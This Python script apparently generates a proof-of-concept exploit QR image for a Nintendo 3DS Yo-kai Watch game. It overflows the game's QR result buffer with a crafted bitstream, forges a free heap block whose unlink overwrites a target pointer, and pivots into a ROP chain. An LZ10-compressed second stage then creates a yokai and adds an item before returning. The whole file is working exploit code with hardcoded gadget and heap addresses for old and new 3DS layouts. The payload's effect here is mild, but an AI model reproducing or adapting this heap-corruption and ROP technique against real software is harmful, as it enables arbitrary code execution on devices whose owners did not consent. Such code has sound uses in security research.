#!/usr/bin/env python3
import argparse
import os
import struct
from dataclasses import dataclass

import qrcode
import qrcode.base
import qrcode.util
from PIL import Image
from qrcode.constants import ERROR_CORRECT_L
from qrcode.util import BitBuffer, create_bytes

# QR result buffer and adjacent heap blocks.
B = 0x326D4924
P = B + 0x40
N = B + 0x997B4
H0 = B - 0x1C0628

N_CAP = 0x00001058
N_FLAGS = 0x04070000
NEXT_BLOCK_ADDR = N + 0x28 + N_CAP


# Layout-specific addresses and output names.
@dataclass(frozen=True)
class Layout:
    field_entry: int
    exit_r8: int
    output: str

    @property
    def target_ref(self) -> int:
        return self.field_entry + 0x14


LAYOUTS = {
    "old3ds": Layout(
        field_entry=0x08E42A9C,
        exit_r8=0x08E42A88,
        output="ywb_qr_poc.png",
    ),
    "new3ds": Layout(
        field_entry=0x0CA42A9C,
        exit_r8=0x0CA42A88,
        output="ywb_qr_poc_new3ds.png",
    ),
}

# Game objects
DEV = 0x006B8A60

# Game data
ITEM_ID = 0xC96C4451  # Chocobar
ITEM_QTY = 1
YOKAI_PARAM_ID = 0xA3A68AA8  # Jibanyan

# Functions and ROP gadgets for this game version.
PIVOT = 0x0011E5A8  # Context load and stack pivot
POP_R0_TO_R3_R10_PC = 0x0019F1C0  # POP {R0-R3,R10,PC}
POP_LR_PC = 0x0011E5C0  # POP {LR,PC}
STR_R0_R1 = 0x0010AF40  # STR R0,[R1]; BX LR
LDR_R0_R1_PLUS4 = 0x0055CEB8  # LDR R0,[R1,#4]; BX LR
ADD18 = 0x0013B724  # ADD R0,R0,#0x18; BX LR
POP_R1_PC = 0x003005EC  # POP {R1,PC}
POP_R0_PC = 0x00112234  # POP {R0,PC}
FREE_BLOCK_FUNC = 0x0013F9E4  # Insert/coalesce a free block.
DECOMPRESS_FUNC = 0x0016734C  # sub_16734C(dst, &out_size, capacity, src); LZ10
CREATE_YOKAI_FUNC = 0x003747E8  # Create a yokai; incoming R0 is unused.
RET_LR = 0x0056FE20  # BX LR
ADD_ITEM_FUNC = 0x003C7144  # Add an item (R0 = ID, R1 = quantity).

# Return stack and registers.
EXIT_SP = 0x0FFFFEB8
EXIT_PC = 0x0012AD08
EXIT_R10 = 0x006B9028
EXIT_R11 = 0x006B8B5C

# Payload object layout.
PREFIX_LEN = 0x1B
OBJ_LEN = 0x1D0
STAGE1_OBJ_LEN = 0x60
STAGE1_BLOB_OFF = 0x60
STAGE2_CAP = (OBJ_LEN + 3) & ~3
DST = B + 0x400
OUT_SIZE = B + 0x3FC

INITIAL_STACK_OFF = 0x078
EXIT_CTX_OFF = 0x120
# Yokai-creation and free-block contexts overlap; their used words are disjoint.
YOKAI_CTX_OFF = 0x160
FREE_CTX_OFF = 0x178
FREE_STACK_OFF = 0x1B8

# QR image configuration.
QR_VERSION = 16
QR_ECC = ERROR_CORRECT_L
QR_MASK = 1


def p32(buf, off, val):
    struct.pack_into("<I", buf, off, val)


def build_fake_object(layout: Layout, base: int):
    b = bytearray(OBJ_LEN)
    object_addr = base
    exit_r9_slot_addr = object_addr + EXIT_CTX_OFF + 0x24

    # Payload object. PIVOT loads R0-R12 from base, then SP/LR/PC.
    # base+0x20..base+0x74 doubles as the fake vtable.
    # Slots not used by the chain must return safely (RET_LR = BX LR).
    p32(b, 0x00, object_addr + 0x20)
    p32(b, 0x14, 1)  # object data field, not used by the chain
    for off in range(0x20, 0x78, 4):
        p32(b, off, RET_LR)
    p32(b, 0x34, object_addr + INITIAL_STACK_OFF)  # PIVOT: LR = new SP
    p32(b, 0x3C, POP_R0_TO_R3_R10_PC)  # PIVOT: PC after stack move
    p32(b, 0x40, PIVOT)  # [base]+0x20 -> [base+0x40]

    # Initial register load; R0-R3/R10 are unused here; PC=POP_LR_PC.
    p32(b, INITIAL_STACK_OFF + 0x14, POP_LR_PC)
    p32(b, INITIAL_STACK_OFF + 0x18, POP_R1_PC)  # POP_LR_PC LR
    p32(b, INITIAL_STACK_OFF + 0x1C, POP_R1_PC)  # POP_LR_PC PC

    # Store [FIELD_ENTRY+4] + 0x30 in [TARGET_REF] and the exit R9 slot.
    p32(b, INITIAL_STACK_OFF + 0x20, layout.field_entry)
    p32(b, INITIAL_STACK_OFF + 0x24, LDR_R0_R1_PLUS4)  # LDR R0,[R1,#4]
    p32(b, INITIAL_STACK_OFF + 0x28, ADD18)
    p32(b, INITIAL_STACK_OFF + 0x2C, ADD18)  # ADD R0,R0,#0x18
    p32(b, INITIAL_STACK_OFF + 0x30, layout.target_ref)
    p32(b, INITIAL_STACK_OFF + 0x34, STR_R0_R1)  # [TARGET_REF] = R0
    p32(b, INITIAL_STACK_OFF + 0x38, exit_r9_slot_addr)
    p32(b, INITIAL_STACK_OFF + 0x3C, STR_R0_R1)  # [exit_r9_slot_addr] = R0
    p32(b, INITIAL_STACK_OFF + 0x44, POP_R0_TO_R3_R10_PC)  # next: [N] = Dev

    # [N] = Dev. POP_R0_TO_R3_R10_PC preloads R0=Dev, R1=N; R2/R3/R10 are dead.
    p32(b, INITIAL_STACK_OFF + 0x48, DEV)
    p32(b, INITIAL_STACK_OFF + 0x4C, N)
    p32(b, INITIAL_STACK_OFF + 0x5C, POP_LR_PC)
    p32(b, INITIAL_STACK_OFF + 0x60, POP_R1_PC)  # STR_R0_R1 return
    p32(b, INITIAL_STACK_OFF + 0x64, STR_R0_R1)

    p32(b, INITIAL_STACK_OFF + 0x68, 0)
    p32(b, INITIAL_STACK_OFF + 0x6C, POP_R0_PC)
    p32(b, INITIAL_STACK_OFF + 0x70, object_addr + FREE_CTX_OFF)
    p32(b, INITIAL_STACK_OFF + 0x74, PIVOT)

    # Return stack used after yokai creation.
    # POP_R0_TO_R3_R10_PC consumes five register slots here; only R0 and PC are live.
    p32(b, 0x100, object_addr + EXIT_CTX_OFF)
    p32(b, 0x114, PIVOT)

    # Exit context: add the item and return to the caller.
    p32(b, EXIT_CTX_OFF + 0x00, ITEM_ID)
    p32(b, EXIT_CTX_OFF + 0x04, ITEM_QTY)
    p32(b, EXIT_CTX_OFF + 0x20, layout.exit_r8)
    # EXIT_CTX_OFF+0x24 (exit R9) is filled by the chain.
    p32(b, EXIT_CTX_OFF + 0x28, EXIT_R10)
    p32(b, EXIT_CTX_OFF + 0x2C, EXIT_R11)
    p32(b, EXIT_CTX_OFF + 0x34, EXIT_SP)
    p32(b, EXIT_CTX_OFF + 0x38, EXIT_PC)
    p32(b, EXIT_CTX_OFF + 0x3C, ADD_ITEM_FUNC)

    # Yokai-creation context: R1=0, R2=YOKAI_PARAM_ID, R3=0.
    # R0 and the other loaded registers are dead.
    p32(b, YOKAI_CTX_OFF + 0x08, YOKAI_PARAM_ID)
    p32(b, YOKAI_CTX_OFF + 0x34, object_addr + 0x100)
    p32(b, YOKAI_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
    p32(b, YOKAI_CTX_OFF + 0x3C, CREATE_YOKAI_FUNC)

    # Free-block context: R0=DEV, R1=N, R2=0.
    p32(b, FREE_CTX_OFF + 0x00, DEV)
    p32(b, FREE_CTX_OFF + 0x04, N)
    p32(b, FREE_CTX_OFF + 0x34, object_addr + FREE_STACK_OFF)
    p32(b, FREE_CTX_OFF + 0x38, POP_R0_TO_R3_R10_PC)
    p32(b, FREE_CTX_OFF + 0x3C, FREE_BLOCK_FUNC)

    # Free-block return frame: load the yokai-creation context.
    p32(b, FREE_STACK_OFF + 0x00, object_addr + YOKAI_CTX_OFF)
    p32(b, FREE_STACK_OFF + 0x14, PIVOT)

    return b


def build_fake_heap_header(layout: Layout):
    b = bytearray(40)
    # ctrl=0: during the H0 free, sub_158AA0(Dev,N) sees [N]!=Dev and
    # returns, so N stays in the physical list until the FREE_BLOCK_FUNC call.
    # +0x10 (owner) is used only as the link base N+0x20/N+0x24; its value
    # is never read. +0x14 is cleared by sub_13F9E4 before any read.
    p32(b, 0x00, 0)
    p32(b, 0x04, H0)  # prev physical block
    p32(b, 0x08, NEXT_BLOCK_ADDR)  # next physical block
    p32(b, 0x18, N_CAP)  # size used when H0+N are coalesced
    p32(b, 0x1C, N_FLAGS)  # bit24 clear = free block
    p32(b, 0x20, P)  # fake fd -> unlink writes [TARGET_REF]=P
    p32(b, 0x24, layout.target_ref - 0x20)  # fake bk
    return b


def lz10_compress(data):
    # Greedy LZ10: 3..18-byte matches, 12-bit displacement.
    out = bytearray()
    flags = 0
    flag_count = 0
    tokens = bytearray()
    i = 0
    n = len(data)
    while i < n:
        best_len = 0
        best_disp = 0
        start = max(0, i - 4096)
        for j in range(i - 1, start - 1, -1):
            if data[j] != data[i]:
                continue
            length = 0
            while (length < 18 and i + length < n
                   and data[j + length] == data[i + length]):
                length += 1
            if length > best_len:
                best_len = length
                best_disp = i - j
                if length == 18:
                    break
        if best_len >= 3:
            flags |= 0x80 >> flag_count
            disp = best_disp - 1
            tokens.append(((best_len - 3) << 4) | (disp >> 8))
            tokens.append(disp & 0xFF)
            i += best_len
        else:
            tokens.append(data[i])
            i += 1
        flag_count += 1
        if flag_count == 8:
            out.append(flags)
            out.extend(tokens)
            flags = 0
            flag_count = 0
            tokens.clear()
    if flag_count:
        out.append(flags)
        out.extend(tokens)
    return bytes(out)


def build_compressed_blob(stage2):
    # Level-5 block header: (decompressed size << 3) | 1 (LZ10).
    data = lz10_compress(stage2)
    return struct.pack("<I", (len(stage2) << 3) | 1) + data


def build_stage1(stack_addr):
    b = bytearray(STAGE1_OBJ_LEN)
    # Stage-1 loader. sub_12AB70 reads [P], then [P+0x40], and calls PIVOT.
    p32(b, 0x00, P + 0x20)
    p32(b, 0x14, 1)
    for off in range(0x20, STAGE1_OBJ_LEN, 4):
        p32(b, off, RET_LR)
    p32(b, 0x34, stack_addr)
    p32(b, 0x38, POP_R0_TO_R3_R10_PC)
    p32(b, 0x3C, POP_R0_TO_R3_R10_PC)
    p32(b, 0x40, PIVOT)
    return b


def build_first_segment(layout: Layout):
    stage2 = build_fake_object(layout, DST)
    blob = build_compressed_blob(stage2)

    stage1_off = PREFIX_LEN
    blob_off = stage1_off + STAGE1_OBJ_LEN
    blob_end = blob_off + len(blob)
    # Leave the decompressor's 0x24-byte stack push below SP clear.
    stack_off = blob_end + 0x24
    while (B + 37 + stack_off) & 3:
        stack_off += 1
    stack_addr = B + 37 + stack_off

    stage1 = build_stage1(stack_addr)
    first = bytearray(stack_off + 0x30)
    first[0:PREFIX_LEN] = b'\xEC' * PREFIX_LEN
    first[stage1_off:stage1_off + len(stage1)] = stage1
    first[blob_off:blob_off + len(blob)] = blob

    # Stage-1 stack: decompressor frame, then the PIVOT frame into stage 2.
    # R0=dst, R1=&out_size, R2=capacity, R3=src.
    p32(first, stack_off + 0x00, DST)
    p32(first, stack_off + 0x04, OUT_SIZE)
    p32(first, stack_off + 0x08, STAGE2_CAP)
    p32(first, stack_off + 0x0C, P + STAGE1_BLOB_OFF)
    p32(first, stack_off + 0x10, 0)
    p32(first, stack_off + 0x14, DECOMPRESS_FUNC)
    p32(first, stack_off + 0x18, DST)
    p32(first, stack_off + 0x1C, 0)
    p32(first, stack_off + 0x20, 0)
    p32(first, stack_off + 0x24, 0)
    p32(first, stack_off + 0x28, 0)
    p32(first, stack_off + 0x2C, PIVOT)
    return first


def build_declared_lengths(total):
    remaining = total
    out = []
    while remaining > 65535:
        out.append(65535)
        remaining -= 65535
    out.append(remaining)
    return out


def build_bitstream(layout: Layout):
    bits = []
    segment = build_first_segment(layout)

    def put(val, n):
        for i in range(n - 1, -1, -1):
            bits.append((val >> i) & 1)

    put(0b0100, 4)
    put(len(segment), 16)
    for by in segment:
        put(by, 8)
    for count in build_declared_lengths(N - (B + 37) - len(segment)):
        put(0b0011, 4)
        put(0, 4)
        put(0, 4)
        put(0, 8)
        put(0b0100, 4)
        put(count, 16)
    put(0b0100, 4)
    put(40, 16)
    for by in build_fake_heap_header(layout):
        put(by, 8)
    put(0b0000, 4)
    while len(bits) % 8:
        bits.append(0)
    out = bytearray()
    for i in range(0, len(bits), 8):
        v = 0
        for j in range(8):
            v = (v << 1) | bits[i + j]
        out.append(v)
    return out


def build_image(layout: Layout):
    scale = 8
    border = 4
    rs = qrcode.base.rs_blocks(QR_VERSION, QR_ECC)
    cap = sum(block.data_count for block in rs)
    data = build_bitstream(layout)
    i = 0
    while len(data) < cap:
        data.append(0xEC if i % 2 == 0 else 0x11)
        i += 1

    def custom_create_data(version, error_correction, data_list):
        # Keep the callback signature; encode the prepared data instead of data_list.
        buf = BitBuffer()
        for by in data:
            buf.put(by, 8)
        return create_bytes(buf, qrcode.base.rs_blocks(version, error_correction))

    qrcode.util.create_data = custom_create_data
    qr = qrcode.QRCode(version=QR_VERSION, error_correction=QR_ECC, box_size=1,
                       border=0, mask_pattern=QR_MASK)
    qr.make(fit=False)
    modules = qr.modules

    dim = (len(modules) + 2 * border) * scale
    W, H = 1280, 1280
    img = Image.new("L", (W, H), 255)
    ox = (W - dim) // 2
    oy = (H - dim) // 2
    for y, row in enumerate(modules):
        for x, dark in enumerate(row):
            if dark:
                x0 = ox + (x + border) * scale
                y0 = oy + (y + border) * scale
                for dy in range(scale):
                    for dx in range(scale):
                        img.putpixel((x0 + dx, y0 + dy), 0)
    here = os.path.dirname(os.path.abspath(__file__))
    img.save(os.path.join(here, layout.output))


def main():
    parser = argparse.ArgumentParser(description="Generate the YWB PoC QR image.")
    parser.add_argument("--layout", choices=tuple(LAYOUTS), default="old3ds")
    args = parser.parse_args()
    build_image(LAYOUTS[args.layout])


if __name__ == "__main__":
    main()
